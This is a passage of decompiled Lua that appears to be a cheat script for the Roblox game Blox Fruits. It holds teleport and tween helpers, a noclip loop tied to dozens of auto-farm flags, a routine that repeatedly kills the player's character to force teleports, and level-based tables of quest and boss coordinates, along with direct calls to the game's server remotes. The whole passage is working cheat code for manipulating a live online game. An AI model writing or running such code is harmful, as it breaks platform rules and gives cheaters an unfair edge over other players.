        if plr.Character.Humanoid.Sit == true then
            vu163.CFrame = CFrame.new(vu163.Position.X, p177.Y, vu163.Position.Z)
        end
        vu182:Play()
        task.spawn(function()
			-- upvalues: (ref) vu182
            while vu182.PlaybackState == Enum.PlaybackState.Playing do
                if not shouldTween then
                    vu182:Cancel()
                    break
                end
                task.wait(0.1)
            end
        end)
    end
end
function TeleportToTarget(p183)
    if (p183.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 1000 then
        _tp(p183)
    else
        _tp(p183)
    end
end
function notween(p184)
    plr.Character.HumanoidRootPart.CFrame = p184
end
function BTP(p185)
    local v186 = game.Players.LocalPlayer
    local v187 = v186.Character.HumanoidRootPart
    local v188 = v186.Character.Humanoid
    local v189 = v186.PlayerGui.Main
    local _ = p185.Position
    local v190 = v187.Position
    while true do
        v188.Health = 0
        v187.CFrame = p185
        v189.Quest.Visible = false
        if (v187.Position - v190).Magnitude > 1 then
            v190 = v187.Position
            v187.CFrame = p185
        end
        task.wait(0.5)
        if (p185.Position - v187.Position).Magnitude <= 2000 then
            return
        end
    end
end
spawn(function()
    while task.wait() do
        pcall(function()
            if _G.SailBoat_Hydra or (_G.WardenBoss or (_G.AutoFactory or (_G.HighestMirage or (_G.HCM or (_G.PGB or (_G.Leviathan1 or (_G.UPGDrago or (_G.Complete_Trials or (_G.TpDrago_Prehis or (_G.BuyDrago or (_G.AutoFireFlowers or (_G.DT_Uzoth or (_G.AutoBerry or (_G.Prehis_Find or (_G.Prehis_Skills or (_G.Prehis_DB or (_G.Prehis_DE or (_G.FarmBlazeEM or (_G.Dojoo or (_G.CollectPresent or (_G.AutoLawKak or (_G.TpLab or (_G.AutoPhoenixF or (_G.AutoFarmChest or (_G.AutoHytHallow or (_G.LongsWord or (_G.BlackSpikey or (_G.AutoHolyTorch or (_G.TrainDrago or (_G.AutoSaber or (_G.FarmMastery_Dev or (_G.CitizenQuest or (_G.AutoEctoplasm or (_G.KeysRen or (_G.Auto_Rainbow_Haki or (_G.obsFarm or (_G.AutoBigmom or (_G.Doughv2 or (_G.AuraBoss or (_G.Raiding or (_G.Auto_Cavender or (_G.TpPly or (_G.Bartilo_Quest or (_G.Level or (_G.FarmEliteHunt or (_G.AutoZou or (_G.AutoFarm_Bone or (getgenv().AutoMaterial or (_G.CraftVM or (_G.FrozenTP or (_G.TPDoor or (_G.AcientOne or (_G.AutoFarmNear or (_G.AutoRaidCastle or (_G.DarkBladev3 or (_G.AutoFarmRaid or (_G.Auto_Cake_Prince or (_G.Addealer or (_G.TPNpc or (_G.TwinHook or (_G.FindMirage or (_G.FarmChestM or (_G.Shark or (_G.TerrorShark or (_G.Piranha or (_G.MobCrew or (_G.SeaBeast1 or (_G.FishBoat or (_G.AutoPole or (_G.AutoPoleV2 or (_G.Auto_SuperHuman or (_G.AutoDeathStep or (_G.Auto_SharkMan_Karate or (_G.Auto_Electric_Claw or (_G.AutoDragonTalon or (_G.Auto_Def_DarkCoat or (_G.Auto_God_Human or (_G.Auto_Tushita or (_G.AutoMatSoul or (_G.AutoKenVTWO or (_G.AutoSerpentBow or (_G.AutoFMon or (_G.Auto_Soul_Guitar or (_G.TPGEAR or (_G.AutoSaw or (_G.AutoTridentW2 or (_G.Auto_StartRaid or (_G.AutoEvoRace or (_G.AutoGetQuestBounty or (_G.MarinesCoat or (_G.TravelDres or (_G.Defeating or (_G.DummyMan or (_G.Auto_Yama or (_G.Auto_SwanGG or (_G.SwanCoat or (_G.AutoEcBoss or (_G.Auto_Mink or (_G.Auto_Human or (_G.Auto_Skypiea or (_G.Auto_Fish or (_G.CDK_TS or (_G.CDK_YM or (_G.CDK or (_G.AutoFarmGodChalice or (_G.AutoFistDarkness or (_G.AutoMiror or (_G.Teleport or (_G.AutoKilo or (_G.AutoGetUsoap or (_G.Praying or (_G.TryLucky or (_G.AutoColShad or (_G.AutoUnHaki or (_G.Auto_DonAcces or (_G.AutoRipIngay or (_G.DragoV3 or (_G.DragoV1 or (_G.SailBoats or (NextIs or (_G.FarmGodChalice or (_G.IceBossRen or (senth or (senth2 or (_G.Lvthan or (_G.beasthunter or (_G.DangerLV or (_G.Relic123 or (_G.tweenKitsune or (_G.Collect_Ember or (_G.AutofindKitIs or (_G.snaguine or (_G.TwFruits or (_G.tweenKitShrine or (_G.Tp_LgS or (_G.Tp_MasterA or (_G.tweenShrine or (_G.FarmMastery_G or _G.FarmMastery_S)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) then
                shouldTween = true
                if not plr.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
                    local v191 = Instance.new("BodyVelocity")
                    v191.Name = "BodyClip"
                    v191.Parent = plr.Character.HumanoidRootPart
                    v191.MaxForce = Vector3.new(100000, 100000, 100000)
                    v191.Velocity = Vector3.new(0, 0, 0)
                end
                local v192, v193, v194 = pairs(plr.Character:GetDescendants())
                while true do
                    local v195
                    v194, v195 = v192(v193, v194)
                    if v194 == nil then
                        break
                    end
                    if v195:IsA("BasePart") then
                        v195.CanCollide = false
                    end
                end
            else
                shouldTween = false
                if plr.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
                    plr.Character.HumanoidRootPart:FindFirstChild("BodyClip"):Destroy()
                end
            end
        end)
    end
end)
function QuestB()
    if World1 then
        if _G.FindBoss ~= "The Gorilla King" then
            if _G.FindBoss ~= "Bobby" then
                if _G.FindBoss ~= "The Saw" then
                    if _G.FindBoss ~= "Yeti" then
                        if _G.FindBoss ~= "Mob Leader" then
                            if _G.FindBoss ~= "Vice Admiral" then
                                if _G.FindBoss ~= "Saber Expert" then
                                    if _G.FindBoss ~= "Warden" then
                                        if _G.FindBoss ~= "Chief Warden" then
                                            if _G.FindBoss ~= "Swan" then
                                                if _G.FindBoss ~= "Magma Admiral" then
                                                    if _G.FindBoss ~= "Fishman Lord" then
                                                        if _G.FindBoss ~= "Wysper" then
                                                            if _G.FindBoss ~= "Thunder God" then
                                                                if _G.FindBoss ~= "Cyborg" then
                                                                    if _G.FindBoss ~= "Ice Admiral" then
                                                                        if _G.FindBoss == "Greybeard" then
                                                                            bMon = "Greybeard"
                                                                            Qdata = nil
                                                                            PosQBoss = CFrame.new(- 5081.3452148438, 85.221641540527, 4257.3588867188)
                                                                            PosB = CFrame.new(- 5081.3452148438, 85.221641540527, 4257.3588867188)
                                                                        end
                                                                    else
                                                                        bMon = "Ice Admiral"
                                                                        Qdata = nil
                                                                        PosQBoss = CFrame.new(1266.08948, 26.1757946, - 1399.57678, - 0.573599219, 0, - 0.81913656, 0, 1, 0, 0.81913656, 0, - 0.573599219)
                                                                        PosB = CFrame.new(1266.08948, 26.1757946, - 1399.57678, - 0.573599219, 0, - 0.81913656, 0, 1, 0, 0.81913656, 0, - 0.573599219)
                                                                    end
                                                                else
                                                                    bMon = "Cyborg"
                                                                    Qname = "FountainQuest"
                                                                    Qdata = 3
                                                                    PosQBoss = CFrame.new(5258.2788085938, 38.526931762695, 4050.044921875)
                                                                    PosB = CFrame.new(6094.0249023438, 73.770050048828, 3825.7348632813)
                                                                end
                                                            else
                                                                bMon = "Thunder God"
                                                                Qname = "SkyExp2Quest"
                                                                Qdata = 3
                                                                PosQBoss = CFrame.new(- 7903.3828125, 5635.9897460938, - 1410.923828125)
                                                                PosB = CFrame.new(- 7994.984375, 5761.025390625, - 2088.6479492188)
                                                            end
                                                        else
                                                            bMon = "Wysper"
                                                            Qname = "SkyExp1Quest"
                                                            Qdata = 3
                                                            PosQBoss = CFrame.new(- 7861.947265625, 5545.517578125, - 379.85974121094)
                                                            PosB = CFrame.new(- 7866.1333007813, 5576.4311523438, - 546.74816894531)
                                                        end
                                                    else
                                                        bMon = "Fishman Lord"
                                                        Qname = "FishmanQuest"
                                                        Qdata = 3
                                                        PosQBoss = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734)
                                                        PosB = CFrame.new(61260.15234375, 30.950881958008, 1193.4329833984)
                                                    end
                                                else
                                                    bMon = "Magma Admiral"
                                                    Qname = "MagmaQuest"
                                                    Qdata = 3
                                                    PosQBoss = CFrame.new(- 5314.6220703125, 12.262420654297, 8517.279296875)
                                                    PosB = CFrame.new(- 5765.8969726563, 82.92064666748, 8718.3046875)
                                                end
                                            else
                                                bMon = "Swan"
                                                Qname = "ImpelQuest"
                                                Qdata = 3
                                                PosB = CFrame.new(5325.09619, 7.03906584, 719.570679, - 0.309060812, 0, 0.951042235, 0, 1, 0, - 0.951042235, 0, - 0.309060812)
                                                PosQBoss = CFrame.new(5191.86133, 2.84020686, 686.438721, - 0.731384635, 0, 0.681965172, 0, 1, 0, - 0.681965172, 0, - 0.731384635)
                                            end
                                        else
                                            bMon = "Chief Warden"
                                            Qname = "ImpelQuest"
                                            Qdata = 2
                                            PosB = CFrame.new(5206.92578, 0.997753382, 814.976746, 0.342041343, - 0.00062915677, 0.939684749, 0.00191645394, 0.999998152, - 0.0000280422337, - 0.939682961, 0.00181045406, 0.342041939)
                                            PosQBoss = CFrame.new(5191.86133, 2.84020686, 686.438721, - 0.731384635, 0, 0.681965172, 0, 1, 0, - 0.681965172, 0, - 0.731384635)
                                        end
                                    else
                                        bMon = "Warden"
                                        Qname = "ImpelQuest"
                                        Qdata = 1
                                        PosB = CFrame.new(5278.04932, 2.15167475, 944.101929, 0.220546961, - 4.49946401e-6, 0.975376427, - 0.0000195412576, 1, 9.03162072e-6, - 0.975376427, - 0.0000210519756, 0.220546961)
                                        PosQBoss = CFrame.new(5191.86133, 2.84020686, 686.438721, - 0.731384635, 0, 0.681965172, 0, 1, 0, - 0.681965172, 0, - 0.731384635)
                                    end
                                else
                                    bMon = "Saber Expert"
                                    PosB = CFrame.new(- 1458.89502, 29.8870335, - 50.633564)
                                end
                            else
                                bMon = "Vice Admiral"
                                Qname = "MarineQuest2"
                                Qdata = 2
                                PosQBoss = CFrame.new(- 5036.2465820313, 28.677835464478, 4324.56640625)
                                PosB = CFrame.new(- 5006.5454101563, 88.032081604004, 4353.162109375)
                            end
                        else
                            bMon = "Mob Leader"
                            PosB = CFrame.new(- 2844.7307128906, 7.4180502891541, 5356.6723632813)
                        end
                    else
                        bMon = "Yeti"
                        Qname = "SnowQuest"
                        Qdata = 3
                        PosQBoss = CFrame.new(1386.8073730469, 87.272789001465, - 1298.3576660156)
                        PosB = CFrame.new(1218.7956542969, 138.01184082031, - 1488.0262451172)
                    end
                else
                    bMon = "The Saw"
                    PosB = CFrame.new(- 784.89715576172, 72.427383422852, 1603.5822753906)
                end
            else
                bMon = "Bobby"
                Qname = "BuggyQuest1"
                Qdata = 3
                PosQBoss = CFrame.new(- 1140.1761474609, 4.752049446106, 3827.4057617188)
                PosB = CFrame.new(- 1087.3760986328, 46.949409484863, 4040.1462402344)
            end
        else
            bMon = "The Gorilla King"
            Qname = "JungleQuest"
            Qdata = 3
            PosQBoss = CFrame.new(- 1601.6553955078, 36.85213470459, 153.38809204102)
            PosB = CFrame.new(- 1088.75977, 8.13463783, - 488.559906, - 0.707134247, 0, 0.707079291, 0, 1, 0, - 0.707079291, 0, - 0.707134247)
        end
    end
    if World2 then
        if _G.FindBoss ~= "Diamond" then
            if _G.FindBoss ~= "Jeremy" then
                if _G.FindBoss ~= "Fajita" then
                    if _G.FindBoss ~= "Don Swan" then
                        if _G.FindBoss ~= "Smoke Admiral" then
                            if _G.FindBoss ~= "Awakened Ice Admiral" then
                                if _G.FindBoss ~= "Tide Keeper" then
                                    if _G.FindBoss ~= "Darkbeard" then
                                        if _G.FindBoss ~= "Cursed Captaim" then
                                            if _G.FindBoss == "Order" then
                                                bMon = "Order"
                                                Qdata = nil
                                                PosQBoss = CFrame.new(- 6217.2021484375, 28.047645568848, - 5053.1357421875)
                                                PosB = CFrame.new(- 6217.2021484375, 28.047645568848, - 5053.1357421875)
                                            end
                                        else
                                            bMon = "Cursed Captain"
                                            Qdata = nil
                                            PosQBoss = CFrame.new(916.928589, 181.092773, 33422)
                                            PosB = CFrame.new(916.928589, 181.092773, 33422)
                                        end
                                    else
                                        bMon = "Darkbeard"
                                        Qdata = nil
                                        PosQBoss = CFrame.new(3677.08203125, 62.751937866211, - 3144.8332519531)
                                        PosB = CFrame.new(3677.08203125, 62.751937866211, - 3144.8332519531)
                                    end
                                else
                                    bMon = "Tide Keeper"
                                    Qname = "ForgottenQuest"
                                    Qdata = 3
                                    PosQBoss = CFrame.new(- 3053.9814453125, 237.18954467773, - 10145.0390625)
                                    PosB = CFrame.new(- 3795.6423339844, 105.88877105713, - 11421.307617188)
                                end
                            else
                                bMon = "Awakened Ice Admiral"
                                Qname = "FrostQuest"
                                Qdata = 3
                                PosQBoss = CFrame.new(5668.9780273438, 28.519989013672, - 6483.3520507813)
                                PosB = CFrame.new(6403.5439453125, 340.29766845703, - 6894.5595703125)
                            end
                        else
                            bMon = "Smoke Admiral"
                            Qname = "IceSideQuest"
                            Qdata = 3
                            PosQBoss = CFrame.new(- 5429.0473632813, 15.977565765381, - 5297.9614257813)
                            PosB = CFrame.new(- 5275.1987304688, 20.757257461548, - 5260.6669921875)
                        end
                    else
                        bMon = "Don Swan"
                        PosB = CFrame.new(2286.2004394531, 15.177839279175, 863.8388671875)
                    end
                else
                    bMon = "Fajita"
                    Qname = "MarineQuest3"
                    Qdata = 3
                    PosQBoss = CFrame.new(- 2441.986328125, 73.359344482422, - 3217.5324707031)
                    PosB = CFrame.new(- 2172.7399902344, 103.32216644287, - 4015.025390625)
                end
            else
                bMon = "Jeremy"
                Qname = "Area2Quest"
                Qdata = 3
                PosQBoss = CFrame.new(636.79943847656, 73.413787841797, 918.00415039063)
                PosB = CFrame.new(2006.9261474609, 448.95666503906, 853.98284912109)
            end
        else
            bMon = "Diamond"
            Qname = "Area1Quest"
            Qdata = 3
            PosQBoss = CFrame.new(- 427.5666809082, 73.313781738281, 1835.4208984375)
            PosB = CFrame.new(- 1576.7166748047, 198.59265136719, 13.724286079407)
        end
    end
    if World3 then
        if _G.FindBoss ~= "Stone" then
            if _G.FindBoss ~= "Hydra Leader" then
                if _G.FindBoss ~= "Kilo Admiral" then
                    if _G.FindBoss ~= "Captain Elephant" then
                        if _G.FindBoss ~= "Beautiful Pirate" then
                            if _G.FindBoss ~= "Cake Queen" then
                                if _G.FindBoss ~= "Longma" then
                                    if _G.FindBoss == "Soul Reaper" then
                                        bMon = "Soul Reaper"
                                        Qdata = nil
                                        PosQBoss = CFrame.new(- 9524.7890625, 315.80429077148, 6655.7192382813)
                                        PosB = CFrame.new(- 9524.7890625, 315.80429077148, 6655.7192382813)
                                    end
                                else
                                    bMon = "Longma"
                                    Qdata = nil
                                    PosQBoss = CFrame.new(- 10238.875976563, 389.7912902832, - 9549.7939453125)
                                    PosB = CFrame.new(- 10238.875976563, 389.7912902832, - 9549.7939453125)
                                end
                            else
                                bMon = "Cake Queen"
                                Qname = "IceCreamIslandQuest"
                                Qdata = 3
                                PosQBoss = CFrame.new(- 819.376709, 64.9259796, - 10967.2832, - 0.766061664, 0, 0.642767608, 0, 1, 0, - 0.642767608, 0, - 0.766061664)
                                PosB = CFrame.new(- 678.648804, 381.353943, - 11114.2012, - 0.908641815, 0.00149294338, 0.41757378, 0.00837114919, 0.999857843, 0.0146408929, - 0.417492568, 0.0167988986, - 0.90852499)
                            end
                        else
                            bMon = "Beautiful Pirate"
                            Qname = "DeepForestIsland2"
                            Qdata = 3
                            PosQBoss = CFrame.new(- 12682.096679688, 390.88653564453, - 9902.1240234375)
                            PosB = CFrame.new(5283.609375, 22.56223487854, - 110.78285217285)
                        end
                    else
                        bMon = "Captain Elephant"
                        Qname = "DeepForestIsland"
                        Qdata = 3
                        PosQBoss = CFrame.new(- 13232.682617188, 332.40396118164, - 7626.01171875)
                        PosB = CFrame.new(- 13376.7578125, 433.28689575195, - 8071.392578125)
                    end
                else
                    bMon = "Kilo Admiral"
                    Qname = "MarineTreeIsland"
                    Qdata = 3
                    PosQBoss = CFrame.new(2179.3010253906, 28.731239318848, - 6739.9741210938)
                    PosB = CFrame.new(2764.2233886719, 432.46154785156, - 7144.4580078125)
                end
            else
                bMon = "Hydra Leader"
                Qname = "AmazonQuest2"
                Qdata = 3
                PosQBoss = CFrame.new(5821.8979492188, 1019.0950927734, - 73.719230651855)
                PosB = CFrame.new(5821.8979492188, 1019.0950927734, - 73.719230651855)
            end
        else
            bMon = "Stone"
            Qname = "PiratePortQuest"
            Qdata = 3
            PosQBoss = CFrame.new(- 289.76705932617, 43.819011688232, 5579.9384765625)
            PosB = CFrame.new(- 1027.6512451172, 92.404174804688, 6578.8530273438)
        end
    end
end
function QuestBeta()
    QuestB()
    return {
        [0] = _G.FindBoss,
        [1] = bMon,
        [2] = Qdata,
        [3] = Qname,
        [4] = PosB
    }
end
function QuestCheck()
    local v196 = game.Players.LocalPlayer.Data.Level.Value
    if World1 then
        if v196 == 1 or v196 <= 9 then
            if tostring(TeamSelf) ~= "Marines" then
                if tostring(TeamSelf) == "Pirates" then
                    Mon = "Bandit"
                    Qdata = 1
                    Qname = "BanditQuest1"
                    NameMon = "Bandit"
                    PosM = CFrame.new(1045.9626464844, 27.002508163452, 1560.8203125)
                    PosQ = CFrame.new(1045.9626464844, 27.002508163452, 1560.8203125)
                end
            else
                Mon = "Trainee"
                Qname = "MarineQuest"
                Qdata = 1
                NameMon = "Trainee"
                PosM = CFrame.new(- 2709.67944, 24.5206585, 2104.24585, - 0.744724929, - 3.97967455e-8, - 0.667371571, 4.32403588e-8, 1, - 1.07884304e-7, 0.667371571, - 1.09201515e-7, - 0.744724929)
                PosQ = CFrame.new(- 2709.67944, 24.5206585, 2104.24585, - 0.744724929, - 3.97967455e-8, - 0.667371571, 4.32403588e-8, 1, - 1.07884304e-7, 0.667371571, - 1.09201515e-7, - 0.744724929)
            end
        elseif v196 == 10 or v196 <= 14 then
            Mon = "Monkey"
            Qdata = 1
            Qname = "JungleQuest"
            NameMon = "Monkey"
            PosQ = CFrame.new(- 1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, 0, - 1, 0, 0)
            PosM = CFrame.new(- 1448.5180664062, 67.853012084961, 11.465796470642)
        elseif v196 == 15 or v196 <= 29 then
            Mon = "Gorilla"
            Qdata = 2
            Qname = "JungleQuest"
            NameMon = "Gorilla"
            PosQ = CFrame.new(- 1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, 0, - 1, 0, 0)
            PosM = CFrame.new(- 1129.8836669922, 40.46354675293, - 525.42370605469)
        elseif v196 == 30 or v196 <= 39 then
            Mon = "Pirate"
            Qdata = 1
            Qname = "BuggyQuest1"
            NameMon = "Pirate"
            PosQ = CFrame.new(- 1141.07483, 4.10001802, 3831.5498, 0.965929627, 0, - 0.258804798, 0, 1, 0, 0.258804798, 0, 0.965929627)
            PosM = CFrame.new(- 1103.5134277344, 13.752052307129, 3896.0910644531)
        elseif v196 == 40 or v196 <= 59 then
            Mon = "Brute"
            Qdata = 2
            Qname = "BuggyQuest1"
            NameMon = "Brute"
            PosQ = CFrame.new(- 1141.07483, 4.10001802, 3831.5498, 0.965929627, 0, - 0.258804798, 0, 1, 0, 0.258804798, 0, 0.965929627)
            PosM = CFrame.new(- 1140.0837402344, 14.809885025024, 4322.9213867188)
        elseif v196 == 60 or v196 <= 74 then
            Mon = "Desert Bandit"
            Qdata = 1
            Qname = "DesertQuest"
            NameMon = "Desert Bandit"
            PosQ = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, 0, - 0.573571265, 0, 1, 0, 0.573571265, 0, 0.819155693)
            PosM = CFrame.new(924.7998046875, 6.4486746788025, 4481.5859375)
        elseif v196 == 75 or v196 <= 89 then
            Mon = "Desert Officer"
            Qdata = 2
            Qname = "DesertQuest"
            NameMon = "Desert Officer"
            PosQ = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, 0, - 0.573571265, 0, 1, 0, 0.573571265, 0, 0.819155693)
            PosM = CFrame.new(1608.2822265625, 8.6142244338989, 4371.0073242188)
        elseif v196 == 90 or v196 <= 99 then
            Mon = "Snow Bandit"
            Qdata = 1
            Qname = "SnowQuest"
            NameMon = "Snow Bandit"
            PosQ = CFrame.new(1389.74451, 88.1519318, - 1298.90796, - 0.342042685, 0, 0.939684391, 0, 1, 0, - 0.939684391, 0, - 0.342042685)
            PosM = CFrame.new(1354.3479003906, 87.272773742676, - 1393.9465332031)
        elseif v196 == 100 or v196 <= 119 then
            Mon = "Snowman"
            Qdata = 2
            Qname = "SnowQuest"
            NameMon = "Snowman"
            PosQ = CFrame.new(1389.74451, 88.1519318, - 1298.90796, - 0.342042685, 0, 0.939684391, 0, 1, 0, - 0.939684391, 0, - 0.342042685)
            PosM = CFrame.new(6241.9951171875, 51.522083282471, - 1243.9771728516)
        elseif v196 == 120 or v196 <= 149 then
            Mon = "Chief Petty Officer"
            Qdata = 1
            Qname = "MarineQuest2"
            NameMon = "Chief Petty Officer"
            PosQ = CFrame.new(- 5039.58643, 27.3500385, 4324.68018, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
            PosM = CFrame.new(- 4881.2309570312, 22.652044296265, 4273.7524414062)
        elseif v196 == 150 or v196 <= 174 then
            Mon = "Sky Bandit"
            Qdata = 1
            Qname = "SkyQuest"
            NameMon = "Sky Bandit"
            PosQ = CFrame.new(- 4839.53027, 716.368591, - 2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, - 0.500031412, 0, 0.866007268)
            PosM = CFrame.new(- 4953.20703125, 295.74420166016, - 2899.2290039062)
        elseif v196 == 175 or v196 <= 189 then
            Mon = "Dark Master"
            Qdata = 2
            Qname = "SkyQuest"
            NameMon = "Dark Master"
            PosQ = CFrame.new(- 4839.53027, 716.368591, - 2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, - 0.500031412, 0, 0.866007268)
            PosM = CFrame.new(- 5259.8447265625, 391.39767456055, - 2229.0354003906)
        elseif v196 == 190 or v196 <= 209 then
            Mon = "Prisoner"
            Qdata = 1
            Qname = "PrisonerQuest"
            NameMon = "Prisoner"
            PosQ = CFrame.new(5308.93115, 1.65517521, 475.120514, - 0.0894274712, - 5.00292918e-9, - 0.995993316, 1.60817859e-9, 1, - 5.16744869e-9, 0.995993316, - 2.06384709e-9, - 0.0894274712)
            PosM = CFrame.new(5098.9736328125, - 0.3204058110714, 474.23733520508)
        elseif v196 == 210 or v196 <= 249 then
            Mon = "Dangerous Prisoner"
            Qdata = 2
            Qname = "PrisonerQuest"
            NameMon = "Dangerous Prisoner"
            PosQ = CFrame.new(5308.93115, 1.65517521, 475.120514, - 0.0894274712, - 5.00292918e-9, - 0.995993316, 1.60817859e-9, 1, - 5.16744869e-9, 0.995993316, - 2.06384709e-9, - 0.0894274712)
            PosM = CFrame.new(5654.5634765625, 15.633401870728, 866.29919433594)
        elseif v196 == 250 or v196 <= 274 then
            Mon = "Toga Warrior"
            Qdata = 1
            Qname = "ColosseumQuest"
            NameMon = "Toga Warrior"
            PosQ = CFrame.new(- 1580.04663, 6.35000277, - 2986.47534, - 0.515037298, 0, - 0.857167721, 0, 1, 0, 0.857167721, 0, - 0.515037298)
            PosM = CFrame.new(- 1820.21484375, 51.683856964111, - 2740.6650390625)
        elseif v196 == 275 or v196 <= 299 then
            Mon = "Gladiator"
            Qdata = 2
            Qname = "ColosseumQuest"
            NameMon = "Gladiator"
            PosQ = CFrame.new(- 1580.04663, 6.35000277, - 2986.47534, - 0.515037298, 0, - 0.857167721, 0, 1, 0, 0.857167721, 0, - 0.515037298)
            PosM = CFrame.new(- 1292.8381347656, 56.380882263184, - 3339.0314941406)
        elseif v196 == 300 or v196 <= 324 then
            Boubty = false
            Mon = "Military Soldier"
            Qdata = 1
            Qname = "MagmaQuest"
            NameMon = "Military Soldier"
            PosQ = CFrame.new(- 5313.37012, 10.9500084, 8515.29395, - 0.499959469, 0, 0.866048813, 0, 1, 0, - 0.866048813, 0, - 0.499959469)
            PosM = CFrame.new(- 5411.1645507812, 11.081554412842, 8454.29296875)
        elseif v196 == 325 or v196 <= 374 then
            Mon = "Military Spy"
            Qdata = 2
            Qname = "MagmaQuest"
            NameMon = "Military Spy"
            PosQ = CFrame.new(- 5313.37012, 10.9500084, 8515.29395, - 0.499959469, 0, 0.866048813, 0, 1, 0, - 0.866048813, 0, - 0.499959469)
            PosM = CFrame.new(- 5802.8681640625, 86.262413024902, 8828.859375)
        elseif v196 == 375 or v196 <= 399 then
            Mon = "Fishman Warrior"
            Qdata = 1
            Qname = "FishmanQuest"
            NameMon = "Fishman Warrior"
            PosQ = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734)
            PosM = CFrame.new(60878.30078125, 18.482830047607, 1543.7574462891)
            if _G.Level and (PosQ.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
            end
        elseif v196 == 400 or v196 <= 449 then
            Mon = "Fishman Commando"
            Qdata = 2
            Qname = "FishmanQuest"
            NameMon = "Fishman Commando"
            PosQ = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734)
            PosM = CFrame.new(61922.6328125, 18.482830047607, 1493.9343261719)
            if _G.Level and (PosQ.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
            end
        elseif v196 == 450 or v196 <= 474 then
            Mon = "God\'s Guard"
            Qdata = 1
            Qname = "SkyExp1Quest"
            NameMon = "God\'s Guard"
            PosQ = CFrame.new(- 4721.88867, 843.874695, - 1949.96643, 0.996191859, 0, - 0.0871884301, 0, 1, 0, 0.0871884301, 0, 0.996191859)
            PosM = CFrame.new(- 4710.04296875, 845.27697753906, - 1927.3079833984)
            if _G.Level and (PosQ.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 4607.82275, 872.54248, - 1667.55688))
            end
        elseif v196 == 475 or v196 <= 524 then
            Mon = "Shanda"
            Qdata = 2
            Qname = "SkyExp1Quest"
            NameMon = "Shanda"
            PosQ = CFrame.new(- 7859.09814, 5544.19043, - 381.476196, - 0.422592998, 0, 0.906319618, 0, 1, 0, - 0.906319618, 0, - 0.422592998)
            PosM = CFrame.new(- 7678.4897460938, 5566.4038085938, - 497.21560668945)
            if _G.Level and (PosQ.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 7894.6176757813, 5547.1416015625, - 380.29119873047))
            end
        elseif v196 == 525 or v196 <= 549 then
            Mon = "Royal Squad"
            Qdata = 1
            Qname = "SkyExp2Quest"
            NameMon = "Royal Squad"
            PosQ = CFrame.new(- 7906.81592, 5634.6626, - 1411.99194, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
            PosM = CFrame.new(- 7624.2524414062, 5658.1333007812, - 1467.3542480469)
        elseif v196 == 550 or v196 <= 624 then
            Mon = "Royal Soldier"
            Qdata = 2
            Qname = "SkyExp2Quest"
            NameMon = "Royal Soldier"
            PosQ = CFrame.new(- 7906.81592, 5634.6626, - 1411.99194, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
            PosM = CFrame.new(- 7836.7534179688, 5645.6640625, - 1790.6236572266)
        elseif v196 == 625 or v196 <= 649 then
            Mon = "Galley Pirate"
            Qdata = 1
            Qname = "FountainQuest"
            NameMon = "Galley Pirate"
            PosQ = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, - 0.996196866, 0, 0.087131381)
            PosM = CFrame.new(5551.0219726562, 78.901351928711, 3930.4128417969)
        elseif v196 >= 650 then
            Mon = "Galley Captain"
            Qdata = 2
            Qname = "FountainQuest"
            NameMon = "Galley Captain"
            PosQ = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, - 0.996196866, 0, 0.087131381)
            PosM = CFrame.new(5441.9516601562, 42.502059936523, 4950.09375)
        end
    elseif World2 then
        if v196 == 700 or v196 <= 724 then
            Mon = "Raider"
            Qdata = 1
            Qname = "Area1Quest"
            NameMon = "Raider"
            PosQ = CFrame.new(- 429.543518, 71.7699966, 1836.18188, - 0.22495985, 0, - 0.974368095, 0, 1, 0, 0.974368095, 0, - 0.22495985)
            PosM = CFrame.new(- 728.32672119141, 52.779319763184, 2345.7705078125)
        elseif v196 == 725 or v196 <= 774 then
            Mon = "Mercenary"
            Qdata = 2
            Qname = "Area1Quest"
            NameMon = "Mercenary"
            PosQ = CFrame.new(- 429.543518, 71.7699966, 1836.18188, - 0.22495985, 0, - 0.974368095, 0, 1, 0, 0.974368095, 0, - 0.22495985)
            PosM = CFrame.new(- 1004.3244018555, 80.158866882324, 1424.6193847656)
        elseif v196 == 775 or v196 <= 799 then
            Mon = "Swan Pirate"
            Qdata = 1
            Qname = "Area2Quest"
            NameMon = "Swan Pirate"
            PosQ = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, - 0.99026376, 0, 0.139203906)
            PosM = CFrame.new(1068.6643066406, 137.61428833008, 1322.1060791016)
        elseif v196 == 800 or v196 <= 874 then
            Mon = "Factory Staff"
            Qname = "Area2Quest"
            Qdata = 2
            NameMon = "Factory Staff"
